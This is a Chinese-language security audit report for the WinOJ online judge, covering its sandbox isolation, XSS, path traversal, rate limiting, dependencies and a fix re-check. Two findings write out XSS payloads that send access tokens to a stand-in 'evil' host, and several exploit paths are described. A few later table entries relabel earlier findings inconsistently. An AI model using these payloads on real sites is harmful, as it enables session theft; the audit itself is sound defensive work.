# WinOJ 代码扫描报告（第六轮 · 三维度全量扫描）

> 扫描时间：2026-08-15（第六轮）
> 扫描范围：`backend/`、`frontend/`、`backend/sandbox/sandbox_runner.cpp`（排除 node_modules/.git）
> 扫描维度：**代码缺陷 / 代码规范 / 悬镜组件（SCA）分析**
> 代码规模：60 个后端源文件 + 30 个前端页面 + 1 个 C++ 沙箱运行器，约 1.5 万行

---

## 〇、执行摘要

| 维度 | 严重 | 高危 | 中危 | 低危/提示 | 备注 |
|------|------|------|------|----------|------|
| 代码缺陷（后端+沙箱+前端） | 3 | 9 | 19 | 31 | 聚焦沙箱隔离边界、存储型 XSS、限流绕过 |
| 代码规范 | — | — | — | 24 项 | 死代码、重复逻辑、日志脱敏缺口为主 |
| 悬镜组件 | 0 CVE | 0 CVE | 0 CVE | 7 项 | `npm audit` 0 漏洞，剩余为版本健康度/CDN 供应链建议 |

> 上轮（第五轮）修复项经复核全部有效无回退（ZIP 穿越、编译参数注入、验证码有效期、submit_answer、Rating 去重等）。
> 本轮重点：**沙箱在非管理员部署下隔离边界缺失**（A1）、**令牌启动失败 fail-open 裸回退**（A2）、**前端 Markdown 存储型 XSS**（S1）、**内联 onclick 属性注入**（前端 H1/H2）、**trust proxy 限流绕过**（后端 H1）。

---

## 一、代码缺陷扫描（Code Defect）

### 严重（Critical）

| # | 位置 | 缺陷 | 危害 | 建议 |
|---|------|------|------|------|
| C-1 | `sandbox/sandbox_runner.cpp:775-803` + `sandbox/executor.js:306-410` | **非管理员部署下无文件系统/网络隔离**。AppContainer 仅在持有 `SeAssignPrimaryTokenPrivilege`（管理员/服务）时启用；普通用户运行时全部落到「受限令牌」路径，仅剥离管理员组与高危特权，**用户 SID 与文件访问权全部保留**。用户代码可读 `config/jwt.txt`、`backend/data/winoj.db`、全部源码并可网络外传 | 默认部署下任何注册用户 ≈ 可窃取 JWT 密钥、伪造管理员、拖库全部用户代码/哈希 | 普通用户部署必须视为无沙箱 fail-closed（拒绝执行需隔离语言），或强制以服务账户运行启用 AppContainer；至少补充完整性降级（Low IL）+ workDir 目录级 ACL 隔离 |
| C-2 | `sandbox/sandbox_runner.cpp:799-803` | **令牌启动失败 fail-open 回退裸进程**。`CreateProcessAsUser(restricted)` 失败时静默退化为 `CreateProcessA` 以 runner 自身令牌运行；若后端以管理员/服务启动，恶意代码即以管理员权限执行（Job 仅限 CPU/内存） | 管理员部署下失败回退 = 提权 RCE | 令牌路径失败必须 fail-closed（写 SYSTEM_ERROR 拒绝执行），绝不回退裸 CreateProcessA |
| C-3 | `frontend/js/markdown.js:1-42` | **`renderMarkdown` 透传原始 HTML → 存储型 XSS**。仅对 Markdown 语法捕获组做转义，正文中的 `<script>`、`<img onerror=...>`、`<iframe srcdoc>` 原样输出经 `innerHTML` 写入。攻击面：profile.html:59（bio，任意用户可控）、problem.html:122、article.html:59、announcement.html:41 | 任意用户把 bio 设为 `<img src=x onerror=fetch('//evil/'+localStorage.getItem('access_token'))>`，访问其资料页的管理员/教师 token 被窃取 | `renderMarkdown` 输出统一经 `DOMPurify.sanitize(html,{USE_PROFILES:{html:true}})`；或后端写库前服务端清洗；所有调用点改走 `safeMarkdown` |

### 高危（High）

| # | 位置 | 缺陷 | 危害 | 建议 |
|---|------|------|------|------|
| D-H1 | `src/server.js:61` + `middleware/ratelimit.js:8-11` | **`trust proxy = 1` 无条件信任最近一跳**。未部署真实反向代理直接暴露时，客户端自行构造 `X-Forwarded-For` 即被采纳为 `req.ip`，每请求换 XFF 即可获得全新限流配额 | login/register/send-code/reset-password/submissions 等全部 IP 限流可被绕过 → 验证码/密码无限速暴力枚举 | 显式配置 `TRUST_PROXY` 环境变量才设置 trust proxy；限流键不直接信任客户端可控头 |
| D-H2 | `services/judge.js:61-71,228,262` + `routes/problems.js:1060-1062` + `routes/submissions.js:274-277` | **测试数据文件路径缺乏包含校验 → 任意文件读取**。导入时仅拒绝绝对路径、不拒绝 `../`；教师导入 `output_file: "../../config/jwt.txt"` 后判题 `readTestdata` 以 CWD 读取该文件，学生 WA 后经 diff 接口可读到期望输出 = JWT 密钥 | 教师角色可读任意磁盘文件；链式利用可伪造任意用户 Token | 导入时 `path.resolve` 后强制落在 `problems/<id>/` 目录内；`readTestdata`/diff 读取前同样做前缀包含校验 |
| D-H3 | `services/judge.js:76-89` | **SPJ 判题脚本 `vm` 沙箱执行 → 逃逸 RCE**。`spj_code` 由 teacher 直接写入并原样 `runInContext`，`vm` 并非绝对安全沙箱（已知 prepareStackTrace/Proxy 内部槽位等逃逸手法） | 教师账号失陷/内鬼 → 判题进程内任意代码执行，提权为服务器 RCE | SPJ 移入独立低权限进程/worker 运行（与用户代码同等待遇），或改用 `isolated-vm` 强隔离 |
| D-H4 | `routes/auth.js:206` + `routes/users.js:65-78` + `routes/discussions.js:94,173` + `routes/articles.js:59` | **存储型 XSS（后端无净化）**。nickname/signature/bio/讨论/文章内容均接受任意字符原样存库返回，与前端 C-3 叠加即全站存储型 XSS | 任意用户可控内容在排行榜/评论区/资料页触发 XSS | 后端对 nickname 白名单校验、signature/bio 限制长度并做 HTML 实体化；前端统一 textContent/DOMPurify 渲染 |
| D-H5 | `frontend/pages/admin.html:1362` | **onclick 属性注入 → su 会话接管**。`onclick="sudoLogin(${u.id}, '${escapeHtml(u.username)}')"` 中 `escapeHtml` 转义 `'` 为 `&#39;`，但 HTML 双引号属性内解析器先解码实体还原 `'` 逃出 JS 字符串 | 恶意用户名 `x');fetch('//evil/?t='+localStorage.getItem('access_token'))//` 在 su 点击「免密」时执行任意代码 | 不用内联 onclick 拼接用户数据，改 `data-id`/`data-username` + `addEventListener` |
| D-H6 | `frontend/pages/problems.html:109,125` | **onclick 属性注入**（同 D-H5 模式）。`filterByCategory('${escapeHtml(c.name)}')` / `toggleTag('${escapeHtml(t.name)}')` | 教师可控的分类/标签名可注入存储型 XSS | 同 D-H5，改用 `data-*` + 事件委托 |
| D-H7 | `frontend/pages/problem.html:126,129` / `article.html:62` / `profile.html:103` | **KaTeX auto-render 未加载 → 页面功能不可用**。三处调用 `renderMathInElement(...)` 但仅引入 `katex.min.js`（不含 auto-render），`renderMathInElement` 未定义 → ReferenceError → 题目/文章/资料页加载失败（对比 announcement/discussion/contest 页已引入 auto-render） | 题目页、文章页、资料页核心功能不可用 | 三页 head 引入 `contrib/auto-render.min.js` 或加 `if (window.renderMathInElement)` 守卫 |
| D-H8 | `sandbox/sandbox_runner.cpp:836-855` + `executor.js:243-263,333-347` | **看门狗强杀跳过 ACL 清理 + 并发 ACL 读写竞态**。AppContainer 模式给 `C:\`→用户→Temp 祖先目录及解释器目录写 ACE，清理仅在正常路径执行；Node 超时保险用 `taskkill /F /T` 直接杀掉 runner → 清理永不执行，系统目录残留死 ACE 堆积；多判题进程对同一目录非原子改 DACL 互相覆盖 | 长期运行系统目录 ACL 退化、死 ACE 堆积、权限竞态 | runner 被杀后由 Node 补做 `cleanupAclGrants`；ACL 读写进程内互斥/串行化；清理纳入 always 路径（RAII/atexit） |
| D-H9 | `sandbox/executor.js:306-410` | **传统回退模式完全无进程树/内存/CPU 隔离**。sandbox_runner 未编译时直接 `spawn`：无 Job Object、无进程数限制、内存仅轮询直系子进程 WorkingSet | fork 炸弹拖垮整机、内存限制可绕过、父进程被杀子进程树失控 | start.bat 编译失败应 fail-closed 拒绝判题；legacy 至少补进程数计数与树形 taskkill |

### 中危（Medium）

| # | 位置 | 缺陷 | 建议 |
|---|------|------|------|
| D-M1 | `services/judge.js:627-646,571-578` + `routes/submissions.js:287-297` | **rejudge 并发竞态 → 双跑 + 重复发 Rating**。`pumpQueue` 出队即删 `queuedIds`，正在运行的提交不在去重集合；rejudge 可对正在判题的提交再入队 → 两个并发 `evaluateTestCases`，`firstAccepted` 同时为真 → 同一 AC 发两次分 | 运行中任务保留在去重集合（新增 `runningIds`）；rejudge 前置校验非 judging；Rating 发放用原子 UPDATE + 唯一约束 |
| D-M2 | `services/captcha.js:42,15-16` | **SVG 验证码可被机器零成本破解**。4 位字符直接渲染为 `<text>` 元素，脚本 regex 提取即还原明文；`Math.random` 可预测 | `/send-code`、`/forgot-password` 验证码门槛被绕过 → 验证码邮件轰炸、重置码暴力枚举 | 改 Path 字形 + 几何变形；`crypto.randomInt` 生成；会话绑定 |
| D-M3 | `routes/auth.js:74-84,114-135` | **6 位邮箱验证码无按邮箱失败次数限制**。`verifyCode` 仅在成功时置 used，连续失败不消耗不累计；限流按 IP 且可被 D-H1 绕过 | 验证码全空间爆破 | `email_codes` 加 `attempts` 计数，错 5 次删除该码并冷却；限流键改 `ip+email` 双维度 |
| D-M4 | `services/security.js:33-56` + `routes/submissions.js:197-201` + `routes/ide.js:51-62` | **AI 审查启发式正则误伤 → 永久封号**。`/\b(?:system\|assistant\|user)\s*:\s*/i` 等宽模式命中普通合法代码（含 `"system: "` 字符串、JSON 解析脚本）即触发 `banUserAndRevoke` 永久封禁 | 攻击者可系统性摧毁正常用户账号，无申诉渠道 | 命中正则仅加严标记送 AI 复核，仅在 AI 确认 + 正则命中双重条件下封号；提供解封/复核 |
| D-M5 | `routes/ide.js:18-33` | **`POST /ide/review` 无限流（匿名可耗 AI 服务）**。`optionalAuth` 未挂 `createRateLimit`，任意未登录者可无限触发 AI 审查 | AI 服务与带宽资源耗尽 | 挂独立限流或改 `requireAuth` |
| D-M6 | `routes/problems.js:975-1007` | **题目导入无 ZIP 条目/解压总大小限制（zip bomb）**。import 路由直接 `new AdmZip` + `getData()` 读全部条目，无条目数/体积上限（对比 testdata-zip 有 1000 条目/500MB 上限） | 教师可致服务器内存/磁盘耗尽 | 复用 testdata-zip 的 MAX_ZIP_ENTRIES / MAX_ZIP_TOTAL_BYTES |
| D-M7 | `routes/problems.js:157-162` | **非公开题目可见性逻辑缺陷**。`is_public=0` 时 `!inContest || !req.user || role==='user'` → 403，导致非公开题目教师/作者自己也无法查看、参赛者也打不开，处于「谁也打不开」状态 | 功能缺陷，与列表接口矛盾 | 明确意图：非公开题目仅限 staff/作者访问，参赛者可访问所属比赛内非公开题 |
| D-M8 | `routes/problems.js:1048-1076` | **导入题目 `test_groups` 的 `group_id` 未重映射**。`groupIdMap` 已计算旧→新映射，但插入 test_cases 仍写旧 `tc.group_id`，仅 `group_id=0` 置空；带分组题目导入后 test_cases 引用不存在 group_id → FK 错误或半导入残留 | 分组导入失败/数据不一致 | 插入 test_cases 前用 `groupIdMap[tc.group_id]` 映射；失败回滚已插入 problem |
| D-M9 | `services/socket.js:56-67` | **Socket 房间加入无归属校验**。任何登录用户可 `join_submission` 任意 submission_id 房间持续接收该提交 judge_status | 他人判题进度泄露（配合提交 ID 可枚举） | join 前校验 `submission.user_id === socket.userId` 或 staff |
| D-M10 | `services/judge.js:82-84` + `scorer.js:48,66-73` | **SPJ/计分脚本同步执行阻塞事件循环**。`runInContext` 同步阻塞整个 Node 进程；`peek()` 每次 `slice` 复制剩余全部为 O(n²)；超深括号递归无上限 | SPJ 题多测试点全局 DoS；大脚本 GC 压力 | SPJ 移 worker 进程；scorer `peek` 改 `startsWith`+字符扫描；脚本长度上限 |
| D-M11 | `services/judge.js:230-231,264-265` | **测试点时间/内存上限来自数据库且无上限校验**。教师可把 `time_limit` 设为小时级 → 长期独占判题线程耗尽判题池 | DoS | 服务端硬上限兜底（TLE≤10s、MLE≤1024MB），超范围拒绝配置 |
| D-M12 | `sandbox/executor.js:191-200,253,263,337,346` | **看门狗 `spawnSync('taskkill')` 同步阻塞事件循环**（高输出流 data 回调内，最多 5s） | 高输出提交暂停全部并发判题与 API | 改异步 `spawn`/`proc.kill()`，流回调内不做同步子进程调用 |
| D-M13 | `services/judge.js:649-656` | **服务重启后 in-flight 沙箱进程成孤儿继续运行**，`recoverInterruptedSubmissions` 把已恢复提交重新入队 → 旧进程与新判题同时执行同一提交 | 双写、重复 Rating、隔离授权残留 | 启动时清理遗留 runner；runner 增加父进程句柄监视自杀 |
| D-M14 | `frontend/js/api.js:394` | **socket.io-client 运行时从 jsDelivr 动态加载**，`loadScript` 注入 CDN 脚本，无版本锁定/SRI | CDN 被投毒即全站 XSS | 自托管并锁版本 + SRI |
| D-M15 | `frontend/js/api.js:63-69` | **access_token 存 localStorage**，与 C-3/D-H4~6 XSS 叠加 = 任意脚本窃取会话 | 会话劫持 | token 移入 httpOnly cookie；至少全站加 CSP + SRI |

### 低危（Low）

| # | 位置 | 缺陷 | 建议 |
|---|------|------|------|
| D-L1 | `routes/auth.js:147-150` | bcrypt 仅在用户存在时执行 → 登录用户名枚举计时侧信道 | 恒定时 bcrypt 或统一延迟 |
| D-L2 | `routes/auth.js:299-301` | 修改密码仅吊销 refresh token，未置 `force_logout_at`，旧 access token 最长 15 分钟有效 | 一并置 force_logout_at |
| D-L3 | `middleware/auth.js:45-67` | `optionalAuth` 不校验 `force_logout_at`，被强制下线用户在 15 分内仍可访问公开接口 | optionalAuth 补 force_logout_at 校验 |
| D-L4 | `src/server.js:169-177` | `/uploads` 静态目录匿名可读（uuid 文件名不可枚举缓解） | 如需保密加登录态校验 |
| D-L5 | `routes/submissions.js:266-281` | WA diff 返回首个失败用例**期望输出**，可逆向探测隐藏测试数据 | OJ 设计取舍，确认是否允许 |
| D-L6 | `middleware/auth.js:86-101` | `requireRole(...)` 取 `Math.min` 语义为「至少最低角色」，多角色时易误解为「任一即可」 | 明确文档或重构语义 |
| D-L7 | `routes/users.js:279-303` | 删除用户无 `canManage` 校验，su 可删除其他 su（仅阻止删最后一个） | 加同级互删限制 |
| D-L8 | `routes/users.js:90` | `typeof rating !== 'number'` 不能拦截 NaN（typeof NaN==='number'） | `Number.isFinite` 校验 |
| D-L9 | `routes/announcements.js:83-86` | teacher 可将公告挂到任意 contest_id（不校验存在/归属） | 校验比赛存在 |
| D-L10 | `routes/discussions.js:92-94` | 创建讨论不校验 problem/contest 存在 → FK 500；可对隐藏题目挂讨论 | 校验存在性与可见性 |
| D-L11 | `sandbox/executor.js:88-105` | `sanitizeFile` 未覆盖 `CONIN$`/`CONOUT$`；主文件按原始名定位与净化名不一致 → 编译失败 | 补设备名正则；用净化后名定位并返回实际路径 |
| D-L12 | `sandbox/sandbox_runner.cpp:783,794,802` | 子进程继承父进程完整环境变量（可能含密钥） | 构造最小白名单环境（PATH/SystemRoot/TEMP）显式传入 |
| D-L13 | `sandbox/sandbox_runner.cpp:96-97,677-690` | ~~沙箱诊断日志混入用户 stderr 并计入输出额度；argv→命令行手工重组未实现 CRT 反斜杠-引号转义~~ ✅ 已修复 | 日志独立管道；实现标准转义函数 |
| D-L14 | `sandbox/sandbox_runner.cpp:645-647` | workDir 内可把 `_meta.json` 创建为目录 → 元数据丢失 | 先 DeleteFile/校验为文件再写 |
| D-L15 | `config/config.js:111` | Windows 上 `fs.writeFileSync(..., {mode:0o600})` 不生效，jwt.txt 可能继承宽松 DACL | Windows 显式 icacls 收缩 ACL |
| D-L16 | `services/email.js:60-63` | 验证码 HMAC 复用 JWT access secret | 独立密钥 |
| D-L17 | `routes/contests.js:251-254` | 冻结截止时间 `toISOString()`（UTC）与 `datetime('now')` 时区边界偏差 | 统一时区处理 |

### 提示（Info）

| # | 位置 | 说明 |
|---|------|------|
| D-I1 | `sandbox/executor.js:1` | `execSync`/`exec` 导入未使用（死代码） |
| D-I2 | `routes/problems.js:164` | 公开题目详情向普通用户暴露 `test_cases_count` |
| D-I3 | `database/db.js:400-411` | 初始管理员密码仅打印控制台日志，日志被采集即泄露 |
| D-I4 | `src/server.js:158` | `security.txt` Contact 回退 `https://github.com` 占位 |
| D-I5 | `services/judge.js:311`、`ideJudge.js:16` | 未脱敏错误信息（可能含内部路径）写入 compile_output/stderr 列 |
| D-I6 | 全局 | `node --test test/` 在 Node 26 下报 `MODULE_NOT_FOUND`（测试脚本路径写法过时）；`security.test.js`/`reset-login.test.js` 需先 `npm start`（集成测试前置条件） |

### 已确认安全（排除项，不报）

- SQL 注入：全项目 `db.prepare` 参数化，动态表名/列名有白名单正则（problems.js:226-231、db.js:17-25）。
- 命令注入：编译/运行全 `spawn/spawnSync` 参数数组，无 `shell:true`。
- ZIP：testdata-zip 有 zip-slip/绝对路径/保留名/条目数/体积多重防护；uploads 有扩展名白名单（已排除 svg）+ magic bytes 校验 + 强制 attachment。
- JWT：密钥 `crypto.randomBytes(64)` 自动生成、config/ 已 gitignore；refresh token 旋转 + bcrypt 哈希 + 原子消费；force_logout_at + iat 比对。
- 密码：bcrypt cost 10、72 字节截断防护、重置后吊销会话。
- 前端鉴权：users/uploads/problems/tags/announcements 等敏感路由均带 `requireRole`，前端隐藏按钮仅 UX 层。
- 讨论区渲染：discussion.html 使用 marked → DOMPurify 正确顺序（标杆）。

---

## 二、代码规范扫描（Code Standard）

### 死代码 / 冗余（可立即删除）

| # | 位置 | 问题 |
|---|------|------|
| S-1 | `sandbox/executor.js:1` | `execSync`、`exec` 导入从未使用 |
| S-2 | `routes/problems.js:1010` | `if (bundle.problem) bundle = bundle;` 恒等赋值冗余 |
| S-3 | `routes/problems.js:74-75` | `fullProblem(p)` 恒等包装（第五轮已删一处，此处仍残留） |
| S-4 | `routes/ide.js:18` | `optionalAuth` 下 `/ide/review` 的匿名分支实际无业务区分 |

### 重复逻辑（应抽共享函数）

| # | 位置 | 问题 |
|---|------|------|
| S-5 | `js/api.js:173` vs `js/markdown.js:3` | `escapeHtml` 双份实现，行为不一致（textContent 法 vs 正则法）→ 统一到单文件 |
| S-6 | `services/socket.js:22-49` vs `middleware/auth.js:16-43` | Socket JWT 认证与 HTTP `requireAuth` 双份实现（上轮列为技术债仍未动） |
| S-7 | `services/judge.js:163-190` vs `196-223` | 分组/非分组每用例跑分循环重复（上轮技术债仍未动） |
| S-8 | `routes/submissions.js:66-103` vs `219-242` | `GET /:id` 与 `/:id/detail` 三连查重复（上轮技术债仍未动） |
| S-9 | `routes/submissions.js:197-201` / `ide.js:51-62` | 恶意代码封禁逻辑重复（`banUserAndRevoke` 已抽，两处调用风格仍 fire-and-forget 与 await 不一） |
| S-10 | `frontend/js/api.js:338-458` | Socket 封装 `join/leave` 四个函数结构重复，可合并 |

### 错误处理 / 响应规范不一致

| # | 位置 | 问题 |
|---|------|------|
| S-11 | 分页字段混用 | `size` vs `limit`（announcements/problem-sets/discussions vs 其余）未统一（上轮技术债） |
| S-12 | `users.js:165`、`problems.js:216,249` | 同类「不能操作」400/ERR_INVALID_STATE 与 403/ERR_FORBIDDEN 混用（上轮技术债） |
| S-13 | `routes/problems.js:157-162` | 权限拒绝逻辑条件嵌套过深、可读性差（与 D-M7 关联） |

### 日志规范（绕过集中脱敏 logger）

| # | 位置 | 问题 |
|---|------|------|
| S-14 | `services/security.js` / `email.js` / `plagiarism.js` / `ideJudge.js` / `socket.js` / `db.js` | 约 8 处裸 `console.*` 未走 `log/logInfo/logError`（上轮 S-23 仅修部分） |
| S-15 | `sandbox/sandbox_runner.cpp:96-97` | 诊断日志写 stderr（用户可见 + 占输出额度），应独立通道（同 D-L13） |

### 魔法数字 / 风格

| # | 位置 | 问题 |
|---|------|------|
| S-16 | `frontend/pages/status.html:95` | 内存计算 `d.memory.rss - d.memory.start_rss` 未处理 undefined/负值 |
| S-17 | `frontend/pages/submit.html:178` | `parseInt(...) || 0` 缺失题目 ID 时静默提交 problem_id=0 |
| S-18 | `frontend/pages/contest.html:196` | socket contest_id 隐式类型比较（`!== parseInt(cid)`） |
| S-19 | `frontend/pages/status.html:42`、`upload.html:54` 等 | 前端仅隐藏按钮式权限控制，未登录直接访问无友好 403 提示 |
| S-20 | `api.js:127` | `setInterval(...,30000)` 无条件调 `/users/me`，无 nav-rating 页也请求 |
| S-21 | 各页面 | 分页 limit 20/10/50/12/100 散落；ide.html 轮询上限 `attempts < 100` 硬编码 |
| S-22 | `problem.html:117`、`admin.html:1459` | 重复 Tailwind class、非法透明度类 `bg-.../300` |
| S-23 | `js/api.js:38` | `API_BASE='/api/v1'` 与页面 `/pages/*` 相对链接混用，部署子路径即失效 |
| S-24 | 全局 | KaTeX 0.16.9 固定 cdnjs，其他库走 jsDelivr 不锁版本，来源与版本策略不统一（与 SCA 3.4 联动） |

---

## 三、悬镜组件（SCA）分析

### 3.1 漏洞审计

- **`npm audit`：0 漏洞**（critical/high/moderate/low 全为 0），126 个依赖（prod 125 + peer 1）。
- 上轮已升级项（bcryptjs→3.0.3、jsonwebtoken 9.0.3、multer→2.2.0）保持无回退。
- 无停维护关键组件；已移除的 svg-captcha 未回退。

### 3.2 组件维护性 / 版本健康度

| 组件 | 当前 | npm 最新 | 状态 / 建议 |
|------|------|----------|-------------|
| express | 4.22.2 | 5.2.1 | ⚠️ 4.x 仍维护但处大版本过渡，**不建议现在升 5.x**（破坏性变更多），建议排期评估 |
| uuid | 11.1.1 | 14.0.1 | ⚠️ 落后 3 个大版本，无漏洞，低优先级 |
| resend | 6.18.0 | 6.20.0 | 落后 1 个 minor，可跟 |
| socket.io / jsonwebtoken / adm-zip / multer / helmet / cors / cookie-parser / bcryptjs | 均最新或同 minor | — | ✅ |

### 3.3 许可证合规

- **无 GPL/AGPL 传染性许可**：106 MIT、3 BSD-3、3 ISC、1 Apache-2.0、1 MIT-0、1 Unlicense（fast-sha256）、2 UNKNOWN（`busboy@1.6.0`、`streamsearch@1.1.0`，实际均为 MIT，仅 lock 未标注）。
- 结论：许可合规风险低。

### 3.4 供应链 / CDN 组件（前端）

| 组件 | 版本 | 来源 | 风险 / 建议 |
|------|------|------|------------|
| tailwindcss | 运行时编译版 | `cdn.tailwindcss.com` | ⚠️ **生产直接使用运行时版**：大体积、依赖网络、无 SRI、无法收紧 CSP。建议构建期生成静态 CSS |
| KaTeX | 0.16.9 | cdnjs / jsDelivr 双源混用 | ⚠️ 来源不统一；建议统一 jsDelivr + 锁版本 + SRI |
| CodeMirror | 5.65.16 | cdnjs | 5.x 已 EOL，6.x 为现行，属旧版依赖（功能可用，维护风险） |
| marked / DOMPurify | 不锁版本 | `marked.min.js`（latest）/ `dompurify@3` | ⚠️ **marked 未锁版本**，跨版本行为漂移风险 |
| socket.io-client | 4.x（运行时 `loadScript` jsDelivr） | 动态注入 | ⚠️ 无 SRI、无锁版本、运行时加载（同 D-M14） |
| echarts / diff | 5.5.1 / 5 | jsDelivr | 无 SRI |

> **共性**：所有 CDN 引入均无 `integrity` 属性、无 `crossorigin` 校验。CDN 被投毒即全站 XSS（且与 C-3/XSS 叠加）。建议：关键库自托管 + SRI；至少统一 jsDelivr 并锁 exact 版本。

### 3.5 其他供应链面

- 依赖锁定：`package-lock.json`（lockfileVersion 3）；`^` 范围允许 minor 自动升级，生产建议 `npm ci`。
- `node:sqlite`：Node 24+ 内置模块，无第三方驱动，供应链面小（本机 Node v26.5.1 满足）。
- `sandbox_runner.cpp`：纯 Windows API + MinGW 编译，无第三方库依赖，供应链面小（编译工具走系统 PATH，需运行时版本管理）。
- 前端无 package.json（纯静态 + CDN），SCA 工具无法覆盖，需靠人工台账。

---

## 四、修复优先级路线图

| 优先级 | 问题 | 预估 |
|--------|------|------|
| P0 | C-1/C-2 沙箱隔离边界缺失与 fail-open 回退、C-3 前端 Markdown 存储型 XSS | 立即（架构级，需评估部署模式） |
| P1 | D-H1 trust proxy 限流绕过、D-H2 测试数据路径穿越、D-H3 SPJ vm 逃逸、D-H4 后端存储型 XSS、D-H5/H6 内联 onclick 注入、D-H7 KaTeX auto-render 页面崩溃 | 本周 |
| P1 | D-M1 rejudge 并发重复发分、D-M2~M4 验证码/封禁逻辑 | 本周 |
| P2 | D-H8/D-H9 沙箱 ACL 清理与 legacy 隔离、D-M5~M15、D-L1~L17 | 渐进 |
| P3 | S-1~S-4 死代码清理、S-5~S-10 共享函数抽取、S-14/S-15 日志统一 | 规范迭代 |
| P3 | SCA：CDN 自托管+SRI、marked 锁版本、tailwind 构建期化、CodeMirror 6 评估、express 5.x 排期 | 规划 |

---

## 五、验证方法说明

- **静态扫描**：三路并行审计（后端路由/服务、前端页面/JS、沙箱 C++/判题核心），所有 `file:line` 引用经人工复核（见上文「已确认安全」排除项与关键缺陷引用）。
- **动态验证**：
  - `npm audit --json` → 0 漏洞（实测）；
  - `npm outdated --json` → express/uuid/resend 三项可升级（实测）；
  - 单测：`scorer/compare/ratelimit/plagiarism` 逐文件 `node --test` 通过；`security.test.js`/`reset-login.test.js` 为需先 `npm start` 的集成测试；
  - ⚠️ `npm test`（`node --test test/`）在 Node 26 下报 `MODULE_NOT_FOUND`，测试脚本路径写法过时（见 D-I6），建议改为 `node --test test/*.test.js` 或依赖 Node 自动发现。
- **未运行**：未启动服务做端到端冒烟（本机无判题运行环境），沙箱行为结论基于源码路径分析。

---

## 六、总结

- **代码缺陷**：3 严重（沙箱隔离边界缺失、fail-open 裸回退、前端存储型 XSS）+ 9 高危（限流绕过、路径穿越、SPJ vm 逃逸、onclick 注入、页面崩溃、ACL 竞态等）需优先处置；19 中危以判题并发/验证码/封禁逻辑为主。
- **代码规范**：24 项，以死代码、重复逻辑、日志脱敏缺口、前端类型比较为主，多为渐进可修。
- **组件安全**：`npm audit` 0 漏洞、许可合规；前端 CDN 供应链（无 SRI、不锁版本、运行时 tailwind）是本轮 SCA 的最主要风险面。
- 上轮全部修复项无回退，本轮新发现的根本性问题集中在**沙箱隔离边界与前端渲染安全**两大方向。

---

## 七、第六轮修复提交（8fd58fb）重扫验证

提交内容：`安全修复第六轮：沙箱fail-closed(令牌路径失败即拒执行，保留WINOJ_EXEC_MODE=2诊断)、DOMPurify消毒、trust proxy收敛、若干路径穿越/ACL/并发修复`。

### 7.1 已确认修复（✅ 验证通过）

| 编号 | 问题 | 修复位置与验证结论 |
|---|---|---|
| C-2 | 沙箱 fail-open 裸回退 | `sandbox_runner.cpp:799-810` 令牌全部失败时返回 `SANDBOX_ERROR` 拒绝执行；仅 `WINOJ_EXEC_MODE=2` 显式诊断仍走裸进程（注释 :727-736）。**fail-closed 成立** |
| C-3 | markdown 存储型 XSS | `markdown.js:11-17` 输出统一过 `DOMPurify.sanitize`；无 DOMPurify 时 `escapeHtml` fail-closed。全站所有 `renderMarkdown(` 调用页均已引入 DOMPurify，无残留 |
| D-H1 | 限流 XFF 绕过 | `server.js` 依 `TRUST_PROXY` 注入 `setTrustProxy`；`ratelimit.js` 默认 `trust=false`，仅显式配置才信任代理头 |
| D-H2 | testdata 路径穿越 | `judge.js:84-101` `readTestdata` 增加 `PROBLEMS_ROOT` 前缀包含校验；`problems.js:1102-1113` 导入 testdata 改用 `safeFileName` 取纯文件名 |
| D-H4 | 用户资料 XSS | `users.js`/`articles.js`/`discussions.js`/`announcements.js` 写入统一过 `sanitizeText`（昵称/签名/bio/文章/讨论/公告） |
| D-H5/H6 | onclick 属性注入 | `admin.html:1362` 等改为 `data-*` + `addEventListener` 委托 |
| D-H7 | KaTeX 未加载崩溃 | `markdown.js` 增加 `renderMathInElement` 守卫；引入 auto-render 扩展 |
| D-M1 | 判题并发重复 | 提交侧 `runningIds` 运行中去重，重判复用 |
| D-M3 | 验证码无重试限制 | `auth.js` 增加尝试次数 + 邮箱维度限流（5 次失败燃尽） |
| D-M4 | 封号需双重确认 | `confirmResult` 需 `safe:false` 且命中特征才封号 |
| D-M5 | /ide/review 无鉴权 | 增加 `requireAuth` + 20/min 限流 |
| D-M6 | ZIP 导入无上限 | 条目数/单文件/总大小上限 |
| D-M7 | 非公开题目可见性 | 仅管理员/作者/参赛者可见 |
| D-M8 | group_id 越权引用 | 导入时校验并重映射到实际存在分组 |
| D-M9 | socket 房间越权 | `join_submission` 校验提交属主 |
| D-M11 | 资源限制超界 | `clampLimits` 双端钳制 |
| D-L1 | bcrypt 时序泄露 | 登录走 `compareSync` 恒定伪哈希兜底（已验证伪哈希 `$2a$10$7QJN4k1P0bWtHjM6Y0vzOe0Y2kZ3p4q5r6s7t8u9v0w1x2y3z4a` 可正常 `compareSync`，不抛异常） |
| D-L2 | 改密未注销旧会话 | 置 `force_logout_at` |
| D-L3 | 会话未校验强制登出 | `optionalAuth` 校验 `force_logout_at` |
| D-L7 | 删除用户缺权限校验 | 增加 `canManage` 前置 |
| D-L8 | 评分解析 `NaN` | `Number.isFinite` 校验 |
| D-L9 | 公告悬挂失效 contest | 校验 contest 存在 |
| D-L10 | 讨论 FK 失效 | 校验 problem/contest 存在 |
| D-L11 | 子进程继承控制台句柄 | 显式 `CONIN$/CONOUT$` 重定向 |
| D-L16 | 邮箱验证码用主密钥 | 独立 `EMAIL_CODE_SECRET` |
| D-I5 | 内部路径泄露 | 编译错误/运行日志剥离内部路径 |
| S-1 | 判题 execSync/exec 命令注入 | `executor.js` 已移除 `execSync/exec`，改 spawn |

- 全部改动 JS 文件 `node --check` 通过。
- 单测：`scorer.test.js`、`compare.test.js`、`ratelimit.test.js` 逐文件通过；组合运行 `node --test` 挂起，因为 `security.test.js`/`reset-login.test.js` 是需先 `npm start` 的集成测试（沿用此前结论）。

### 7.2 未修复 / 残留（⚠️ 仍存在）

| 编号 | 问题 | 现状 |
|---|---|---|
| C-1 | 非管理员部署无文件系统/网络隔离 | **未修复（架构性）**。受限令牌保留用户 SID，仍能访问同用户文件；README 已声明为已知限制。本提交仅修复了令牌失败时的 fail-open 回退（C-2），未加默认 Low-IL 或 ACL 隔离。提升优先级：`WINOJ_EXEC_MODE=1` 之外，建议管理员部署默认开启低完整性令牌 |
| D-H3 | SPJ 同步 `vm.createContext`+`runInContext` | **未修复**。`judge.js:111-113` 仍同步执行任意 SPJ，可阻塞事件循环且无沙箱逃逸防护 |
| D-M2 | 验证码 `<text>` 元素可提取 + `Math.random` | **未修复**。`captcha.js` 仍为纯文本字符渲染，非图形化 |
